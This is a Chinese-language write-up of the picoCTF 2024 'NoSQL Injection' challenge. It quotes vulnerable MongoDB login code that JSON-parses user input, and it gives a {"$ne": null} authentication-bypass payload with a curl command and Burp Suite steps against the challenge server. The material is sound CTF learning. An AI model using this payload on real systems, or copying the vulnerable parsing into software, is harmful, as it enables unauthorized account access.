
#wp #web

【[[WEB]]】提高题 - [[PICOCTF]]

创建时间：2025-07-19 15:03
题目链接：[picoCTF - picoGym Challenges](https://play.picoctf.org/practice/challenge/443?category=1)
### 解题过程
### **picoCTF 2024: [[NoSQL]] Injection - Writeup**

hints：
![](https://cdn.jsdelivr.net/gh/wydyxhxs/images/pic/20250719150503420.png)

![](https://cdn.jsdelivr.net/gh/wydyxhxs/images/pic/20250719150603159.png)

---

### **漏洞分析**

这道题涉及 **NoSQL 注入**，这种漏洞发生在非关系型数据库（例如 MongoDB）中，攻击者可以通过特殊的查询条件影响数据库的行为。

我们从题目附件中（server.js）获得的信息是：后端使用 MongoDB 作为数据库，并且登录功能存在漏洞。代码如下所示：

```js
const user = await User.findOne({
  email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email,
  password: password.startsWith("{") && password.endsWith("}") ? JSON.parse(password) : password,
});
```

这段代码的功能是检查 `email` 和 `password` 是否被包裹在 `{}` 中。如果是，它们将被当作 JSON 字符串进行解析，然后应用于 MongoDB 的查询。

例如，如果输入的 `email` 字段是 `{"$ne": null}`，MongoDB 会执行一个查询，表示 `email` 不等于 `null`，并且根据这一条件查找用户。

**关键漏洞：**

- 该系统使用了 `JSON.parse()` 来解析用户输入。如果攻击者构造了一个特殊的 JSON 字符串，它将被当做查询条件传递给 MongoDB。
    
- MongoDB 查询语言允许使用特殊操作符，如 `"$ne": null`，这使得任何值都能通过验证。攻击者可以利用这一点绕过身份验证。
    

---

### **漏洞利用**

#### **构造恶意请求**

我们可以通过注入 MongoDB 查询条件来绕过认证。有效的注入内容通常是通过将 `email` 和 `password` 字段设置为以下形式：

```js
{
  "email": "{\"$ne\": null}",
  "password": "{\"$ne\": null}"
}
```

这里：

- `{"$ne": null}` 是 MongoDB 查询的语法，表示 `email` 或 `password` 不等于 `null`。这将匹配所有非 `null` 的值，绕过了对 `email` 和 `password` 字段的实际验证。
    
- 由于 MongoDB 查询语言的灵活性，任何不为 `null` 的值都会通过验证。
    

#### **通过 curl 发送请求**

我们可以使用 `curl` 发送 POST 请求来测试这个注入。以下是发送请求的命令：

```json
curl -X POST http://atlas.picoctf.net:54037/ \
  -H "Content-Type: application/json" \
  -d '{"email": "{\"$ne\": null}", "password": "{\"$ne\": null}"}'
```

这条命令向服务器发送了带有恶意查询条件的 `email` 和 `password` 字段，目的是绕过身份验证。

#### **使用 Burp Suite 测试注入**

通过 Burp Suite 也可以进行同样的操作：

1. 启动 Burp Suite 并将浏览器代理设置为 Burp 代理。

2. 访问登录页面并捕获 POST 请求。

3. 将请求发送到 Repeater，并在 `email` 和 `password` 字段中注入 `{"$ne": null}`。

4. 发送修改后的请求，查看响应结果。
![](https://cdn.jsdelivr.net/gh/wydyxhxs/images/pic/20250719150954323.png)

---

### **获取 Flag**

登录后，服务器会返回一个包含 `token` 字段的 JSON 响应。这个 `token` 字段通常是 Base64 编码的，包含了题目的 Flag。
![](https://cdn.jsdelivr.net/gh/wydyxhxs/images/pic/20250719151050596.png)